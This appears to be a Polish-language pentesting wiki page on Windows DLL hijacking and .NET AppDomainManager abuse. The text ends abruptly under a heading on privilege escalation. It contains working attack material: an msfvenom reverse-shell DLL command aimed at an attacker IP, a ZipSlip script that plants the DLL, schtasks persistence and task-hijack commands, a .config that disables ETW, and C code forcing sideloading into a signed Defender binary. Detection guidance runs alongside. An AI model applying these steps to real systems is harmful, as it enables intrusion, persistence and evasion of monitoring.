# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informacje podstawowe

DLL Hijacking polega na skłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Stosuje się go głównie do wykonywania kodu i uzyskiwania trwałości, a rzadziej do eskalacji uprawnień. Choć tutaj skupiamy się na eskalacji, metoda przejmowania pozostaje taka sama niezależnie od celu.

### Często stosowane techniki

W DLL Hijacking stosuje się kilka metod, których skuteczność zależy od sposobu ładowania bibliotek DLL przez aplikację:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL złośliwą, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnej biblioteki.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce wyszukiwania poprzedzającej ścieżkę z legalną biblioteką, z wykorzystaniem kolejności wyszukiwania stosowanej przez aplikację.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, uznając ją za wymaganą, ale nieistniejącą bibliotekę.
4. **DLL Redirection**: Zmiana parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnej biblioteki DLL jej złośliwym odpowiednikiem w katalogu WinSxS — metoda często kojarzona z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu razem ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

Aplikacja może też implementować **własny loader DLL**. Proces z podwyższonymi uprawnieniami może wyliczać pliki w podkatalogu, takim jak `Libraries` lub `Plugins`, i przekazywać wybraną bibliotekę DLL do programu pomocniczego, niezależnie od standardowej kolejności wyszukiwania bibliotek DLL w Windows. Jeśli inne konto może tworzyć pliki w tym konkretnym katalogu, potraktuj to jako trop do sprawdzenia: potwierdź tożsamość procesu, efektywne ACL katalogu, regułę wyboru plików i możliwość wywołania operacji ładowania. Sam fakt, że katalog obok pliku wykonywalnego jest zapisywalny, nie dowodzi, że proces ładuje z niego biblioteki DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Dodawanie importów do PE po instalacji

W klasycznym side-loadingu zaufany plik PE pozostaje niezmieniony, a atak polega na wygraniu rozwiązywania nazw bibliotek DLL. **Import grafting** polega natomiast na zmodyfikowaniu pliku PE, który został już załadowany przez zaufany program. Atakujący dodaje deskryptor importu oraz powiązane wpisy lookup/IAT dla kontrolowanej przez siebie biblioteki DLL. Gdy Windows rekurencyjnie rozwiązuje tę zależność, mapuje dodaną bibliotekę DLL i uruchamia jej kod inicjalizacyjny wewnątrz poza tym legalnego procesu. Jest to modyfikacja pliku PE na dysku, a nie operacja polegająca na zastąpieniu wskaźnika funkcji w aktywnej tablicy IAT hookiem działającym w czasie wykonywania.<sup>[[31]](#references)[[32]](#references)</sup>

Zmodyfikowany plik PE może być pośrednią biblioteką DLL dostawcy, a nie plikiem wykonywalnym uruchamianym przez użytkownika lub Harmonogram zadań. Schemat, który można wielokrotnie wykorzystać, wygląda następująco:<sup>[[32]](#references)</sup>

1. Skopiuj legalny plik wykonywalny i jego zależności do katalogu kontrolowanego przez atakującego.
2. Zmodyfikuj struktury importów jednej z zależności tak, aby wskazywały złośliwą bibliotekę DLL, zachowując oczekiwane eksporty i normalne działanie zależności.
3. Skonfiguruj autostart lub zaplanowane zadanie, aby uruchamiało legalny plik wykonywalny. Loader mapuje zmodyfikowaną zależność, a następnie nowo zaimportowaną bibliotekę DLL. Informacje o wyliczaniu zadań znajdziesz w [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks).
4. Nie umieszczaj czasochłonnych operacji w `DllMain`; zaobserwowany loader utworzył wątek roboczy i kontynuował w nim deszyfrowanie etapowe.

Różni się to od kompromitacji łańcucha dostaw po stronie dostawcy: pakiet dostawcy jest czysty, a modyfikacja importu następuje po instalacji. Podczas analizy sprawdź każdy moduł w katalogu użytym do etapowego uruchomienia, nie tylko plik EXE hosta: porównaj listy importów i hashe zależności z zaufaną instalacją, zweryfikuj podpisy i zbadaj pliki binarne dostawcy uruchamiane z nietypowych, zapisywalnych lokalizacji, takich jak `C:\ProgramData`. Zaplanowane zadanie wskazujące skopiowany program do raportowania awarii lub aktualizator w takim katalogu może być szczególnie przydatnym tropem.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczny DLL sideloading nie jest jedynym sposobem na skłonienie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **zarządzaną**, CLR odczytuje również **plik konfiguracji aplikacji** o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). W tym pliku można zdefiniować własny **AppDomainManager**. Jeśli konfiguracja wskazuje kontrolowane przez atakującego zestawienie umieszczone obok pliku EXE, CLR załaduje je **przed standardową ścieżką wykonywania kodu aplikacji** i uruchomi w zaufanym procesie.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, aby użyć niestandardowego menedżera, muszą być obecne zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalny menedżer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktyczne uwagi:
- Ta technika dotyczy **wyłącznie .NET Framework**. Wykorzystuje parsowanie konfiguracji CLR, a nie kolejność wyszukiwania DLL Win32.
- Host musi być **zarządzanym plikiem EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie obecności **nagłówka CLR Runtime** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`); plik zwykle znajduje się **obok pliku EXE**.
- Przydaje się to w przypadku **podpisanych plików binarnych Microsoftu lub dostawców**, ponieważ zaufany plik EXE pozostaje nietknięty, a złośliwy zarządzany zestaw wykonuje się w tym samym procesie.
- Jeśli masz już katalog instalatora/aktualizacji z prawem zapisu, hijacking AppDomainManager może posłużyć jako **pierwszy etap**, po którym można użyć klasycznego DLL sideloading lub ładowania refleksyjnego w kolejnych etapach.

### AppDomainManager jako downloader i mechanizm inicjujący zadanie harmonogramu

Praktyczny schemat włamania polega na połączeniu zaufanego zarządzanego pliku EXE ze złośliwym plikiem `*.config` i złośliwą biblioteką DLL AppDomainManager, która pełni wyłącznie funkcję **niewielkiego bootstrappera**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub aktualizator .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Przylegający plik konfiguracyjny powoduje, że CLR ładuje zestaw atakującego **przed** rozpoczęciem działania logiki legalnej aplikacji.
3. Złośliwy manager wykonuje **kontrolę ścieżki** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE uruchomiono z `Downloads`, a drugi etap uruchamia wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli kontrola przejdzie pomyślnie, pobiera właściwy payload do ścieżki z prawem zapisu użytkownika, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia trwałość za pomocą zaplanowanego zadania.

Dlaczego ten wariant ma znaczenie:
- Podpisany host EXE pozostaje bez zmian, więc analiza, która sprawdza jedynie sumę kontrolną głównego pliku binarnego, może nie wykryć naruszenia.
- Prosta **analiza antywsteczna oparta na ścieżce** jest powszechna: przeniesienie zestawu ZIP/EXE/DLL na Pulpit, do Temp lub do ścieżki sandboxa może celowo przerwać łańcuch.
- Biblioteka DLL AppDomainManager pierwszego etapu może być mała i mało rzucać się w oczy, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład ustanowienia trwałości, często spotykany w tym schemacie:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny poziom** dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Tę technikę często lepiej klasyfikować jako **wykonanie/persistence przez nadużycie konfiguracji .NET** niż klasyczne hijacking kolejności wyszukiwania brakującej DLL, choć operatorzy często łączą obie techniki.

Wskaźniki do wykrywania:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek rozpakowywania ZIP**, `Downloads`, `%TEMP%` lub innych folderów z prawem zapisu dla użytkownika, z plikiem `<exe>.config` **w tym samym folderze**.
- Nowe zaplanowane zadania, których akcja wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a ich nazwy naśladują programy aktualizujące przeglądarki/dostawców.
- Krótkotrwałe zarządzane procesy bootstrap, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie przedwcześnie, jeśli ścieżka pliku wykonywalnego nie wskazuje na oczekiwany katalog profilu użytkownika.

### Hijacking istniejącego zaplanowanego zadania w celu ponownego uruchomienia łańcucha sideload

W przypadku persistence nie szukaj wyłącznie **tworzenia nowego zadania**. Niektóre grupy intruzów czekają, aż legalny instalator utworzy **zwykłe zadanie aktualizujące**, a następnie **zmieniają akcję zadania**, tak aby jego istniejąca nazwa, autor i wyzwalacz nadal wyglądały znajomo dla obrońców.

Powtarzalny przebieg:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj zadanie, które zwykle tworzy.
2. Wyeksportuj XML zadania i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp tylko akcję, tak aby zadanie uruchamiało **zaufany plik hosta EXE** z katalogu stagingowego z prawem zapisu dla użytkownika, który następnie side-loaduje lub ładuje przez AppDomain rzeczywisty payload.
4. Zarejestruj ponownie zadanie pod tą samą nazwą, zamiast tworzyć nowy, oczywisty artefakt persistence.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Dlaczego jest to bardziej skryte:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jak nazwa programu aktualizującego dostawcy).
- Uruchamia je **usługa Task Scheduler**, więc walidacja procesu nadrzędnego lub przodków często wykrywa oczekiwany łańcuch harmonogramu zamiast `explorer.exe`.
- Zespoły DFIR, które wyszukują tylko **nowe nazwy zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty do wyszukiwania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj pliki XML z `C:\Windows\System32\Tasks\*` oraz metadane z `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z wartościami bazowymi.
- Generuj alert, gdy **zadanie aktualizatora wyglądające na pochodzące od dostawcy** uruchamia się z **katalogów zapisywalnych przez użytkownika** lub uruchamia plik .NET EXE z sąsiadującym plikiem `*.config`.

> [!TIP]
> Aby poznać łańcuch krok po kroku, który łączy HTML staging, konfiguracje AES-CTR i implanty .NET z DLL sideloadingiem, zapoznaj się z poniższym workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Powiązanie side-loaded stage z wierszem poleceń usługi

Side-loaded DLL może wymagać czegoś więcej niż oczekiwanej nazwy hosta EXE i DLL. Mandiant opisał loader, który wiąże deszyfrowanie payloadu z argumentem wiersza poleceń i nazwą pliku wykonywalnego hosta.<sup>[[33]](#references)</sup> W późniejszym łańcuchu opartym na usłudze skopiowany, legalny host załadował sąsiadujący plik `mscoree.dll`, który eksportował `LockClrVersion` i odszyfrowywał osadzony stage dopiero po wyprowadzeniu klucza AES-128 z argumentu usługi i nazwy bazowej pliku wykonywalnego hosta. Każde wejście było obcinane lub dopełniane bajtami NUL do 16 bajtów; klucz bajt po bajcie stanowiło `argument XOR embedded_key XOR executable_basename`, a następnie payload był odszyfrowywany za pomocą AES-CBC bez dopełniania. Zmiana nazwy hosta lub uruchomienie go bez oczekiwanego argumentu zmienia klucz i uniemożliwia odszyfrowanie tego stage, nawet jeśli DLL nadal się ładuje. Odtwarzając lub analizując ten wariant, zachowaj dokładny argument wiersza poleceń i nazwę bazową.<sup>[[34]](#references)</sup>

To **bramka payloadu nałożona na zwykły DLL side-loading**, a nie nowa reguła kolejności wyszukiwania DLL ani samodzielny mechanizm eskalacji uprawnień. Poziom uprawnień wynika z kontekstu bezpieczeństwa usługi. W [workflow C2 opartym na GitHub issue i plikach repozytorium](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) osobno opisano późniejszy transport.<sup>[[34]](#references)</sup>

## Znajdowanie brakujących DLL

Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **2 poniższych filtrów**:

![Typowe techniki - znajdowanie brakujących DLL: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 poniższych filtrów](<../../../images/image (961).png>)

![Typowe techniki - znajdowanie brakujących DLL: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 poniższych filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **File System Activity**:

![Typowe techniki - znajdowanie brakujących DLL: i wyświetlenie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **brakujących DLL ogólnie**, **pozostaw** to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw kolejny filtr, na przykład **"Process Name" "contains" `<exec name>`**, uruchom go i zatrzymaj rejestrowanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, poszukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, do której możesz zapisywać. Może się tak zdarzyć, gdy masz kontrolę nad katalogiem przeszukiwanym przed katalogiem zawierającym legalną DLL albo gdy żądana DLL nie istnieje, a ty możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **znajdziesz szczegółowe informacje o sposobie ładowania DLL.**

**Aplikacje Windows** szukają DLL, korzystając z zestawu **predefiniowanych ścieżek wyszukiwania** i stosując określoną kolejność. Do DLL hijackingu dochodzi, gdy szkodliwa DLL zostaje umieszczona w jednym z tych katalogów tak, aby została załadowana przed oryginalną DLL. Można temu zapobiec, dopilnowując, by aplikacja używała ścieżek bezwzględnych przy odwoływaniu się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie ma funkcji, która zwraca ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
   1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Pamiętaj, że nie obejmuje to ścieżki dla konkretnej aplikacji określonej w kluczu rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Gdy tryb ten jest wyłączony, bieżący katalog przesuwa się na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpocznie się w katalogu modułu wykonywalnego ładowanego przez **LoadLibraryEx**.

DLL można też załadować ze ścieżki bezwzględnej, a nie na podstawie nazwy. W takim przypadku Windows szuka samej DLL wyłącznie pod tą ścieżką; zależności żądane po nazwie nadal podlegają odpowiedniej kolejności wyszukiwania.

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj omawiać.

### Łączenie dowolnego zapisu plików z hijackingiem brakującej DLL

**Powiązana technika:** [przełączanie mount pointów sterowane oplockiem przeciwko uprzywilejowanemu mechanizmowi naprawczemu](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny działa **zgodnie z harmonogramem lub jako usługa**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (pozycja nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem oryginalnej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym eksportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli twoim prymitywem jest **dowolny zapis w stylu ZipSlip**, przygotuj plik ZIP, którego wpis wychodzi poza katalog rozpakowywania, tak aby DLL trafiła do katalogu aplikacji:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Dostarcz archiwum do monitorowanego folderu wejściowego/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą bibliotekę DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając kontrolowany przez atakującego katalog, można wymusić, aby proces docelowy, który wyszukuje importowaną bibliotekę DLL po nazwie (bez ścieżki bezwzględnej i bez użycia bezpiecznych flag ładowania), załadował złośliwą bibliotekę DLL z tego katalogu.

Główna idea
- Utwórz parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący kontrolowany folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny procesu docelowego wyszuka bibliotekę DLL po nazwie, loader uwzględni podaną wartość DllPath podczas wyszukiwania, co umożliwi niezawodny sideloading, nawet jeśli złośliwa biblioteka DLL nie znajduje się w tym samym katalogu co plik EXE procesu docelowego.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się to od SetDllDirectory, które wpływa tylko na bieżący proces.
- Proces docelowy musi importować bibliotekę DLL lub wywoływać LoadLibrary, podając jej nazwę (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodowane ścieżki bezwzględne nie mogą zostać przejęte. Eksporty przekazywane dalej i SxS mogą zmienić kolejność wyszukiwania.

Minimalny przykład w C (ntdll, ciągi znaków w formacie wide, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloading DLL przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Przykład użycia operacyjnego
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub przekazujący wywołania do prawdziwej biblioteki) w katalogu DllPath.
- Uruchom podpisany plik binarny, który — jak wiadomo — wyszukuje xmllite.dll po nazwie, korzystając z opisanej wyżej techniki. Loader rozwiązuje import przy użyciu podanego DllPath i przeprowadza sideloading Twojej biblioteki DLL.

Zaobserwowano, że technika ta jest wykorzystywana w rzeczywistych atakach do tworzenia wieloetapowych łańcuchów sideloadingu: początkowy launcher zapisuje pomocniczą bibliotekę DLL, która następnie uruchamia podpisany przez Microsoft, podatny na hijacking plik binarny z niestandardowym DllPath, aby wymusić załadowanie biblioteki DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### Hijacking AppDomainManager w .NET za pomocą `.exe.config`

W przypadku celów **.NET Framework** sideloading można przeprowadzić **przed `Main()`** bez modyfikowania pamięci, wykorzystując sąsiedni plik **`.exe.config`** aplikacji. Zamiast polegać wyłącznie na kolejności wyszukiwania bibliotek DLL Win32, atakujący umieszcza legalny plik EXE .NET obok złośliwego pliku konfiguracyjnego i co najmniej jednego kontrolowanego przez siebie zestawu.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Uruchamia się host EXE, a **CLR odczytuje `<exe>.config`**.
2. Plik konfiguracyjny ustawia **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, aby środowisko uruchomieniowe utworzyło kontrolowany przez atakującego obiekt `AppDomainManager`.
3. Złośliwy manager uzyskuje **możliwość wykonania kodu przed `Main()`** w zaufanym procesie hosta.
4. Ten sam plik konfiguracyjny może wymusić, by CLR najpierw rozwiązywał lokalne zestawy (na przykład InitInstall.dll, Updater.dll, uevmonitor.dll), a także osłabić weryfikację środowiska uruchomieniowego i telemetrię bez patchowania inline.

Schemat charakterystyczny dla kampanii (dokładne zagnieżdżenie może się różnić w zależności od dyrektywy lub wersji CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** ogranicza rozwiązywanie assembly do katalogu aplikacji, zmieniając ten katalog w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się logika legalnej aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może umożliwić aplikacji pełnego zaufania załadowanie niepodpisanych lub zmodyfikowanych assembly bez błędu walidacji strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** zapewnia bardziej przewidywalny wybór runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza widoczność własnych zdarzeń ETW** na podstawie konfiguracji, zamiast patchowania przez implant funkcji `EtwEventWrite` w pamięci.

Schemat operacyjny obserwowany w ostatnich kampaniach:
- Etap 1 zapisuje `setup.exe`, `setup.exe.config` i lokalne assembly.
- Etap 2 kopiuje je do wiarygodnie wyglądającego katalogu **aktualizacji w AppData**, zmienia nazwę hosta na coś w rodzaju `update.exe` i uruchamia go ponownie za pomocą **zaplanowanego zadania**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwany proces nadrzędny `svchost.exe` uruchomiony przez Task Scheduler) przed załadowaniem końcowego DLL/eksportu RAT.

Pomysły na wykrywanie:
- Podpisane lub w inny sposób legalne **pliki wykonywalne .NET** uruchomione z podejrzanymi, sąsiadującymi plikami **`.config`** w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Zaplanowane zadania ponownie uruchamiające pliki binarne aktualizacji pod zmienioną nazwą z katalogów **`%LOCALAPPDATA%`** lub specyficznych dla aplikacji katalogów `\bin\update\`.
- Łańcuchy procesów nadrzędnych i podrzędnych, w których zaplanowane zadanie uruchamia zaufany host .NET, który natychmiast ładuje assembly spoza producenta z własnego katalogu.

#### Wyjątki od kolejności wyszukiwania DLL opisane w dokumentacji Windows

W dokumentacji Windows opisano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **DLL o takiej samej nazwie jak DLL już załadowany do pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego sprawdza przekierowania i manifest, a następnie używa DLL już znajdującego się w pamięci. **W tym przypadku system nie wyszukuje DLL**.
- Jeśli DLL jest rozpoznawany jako **znany DLL** dla bieżącej wersji Windows, system użyje jego znanej wersji wraz ze wszystkimi zależnymi DLL, **pomijając wyszukiwanie**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie zależnych DLL odbywa się tak, jakby wskazano je wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkowy DLL zidentyfikowano za pomocą pełnej ścieżki.

### Eskalacja uprawnień

**Wymagania**:

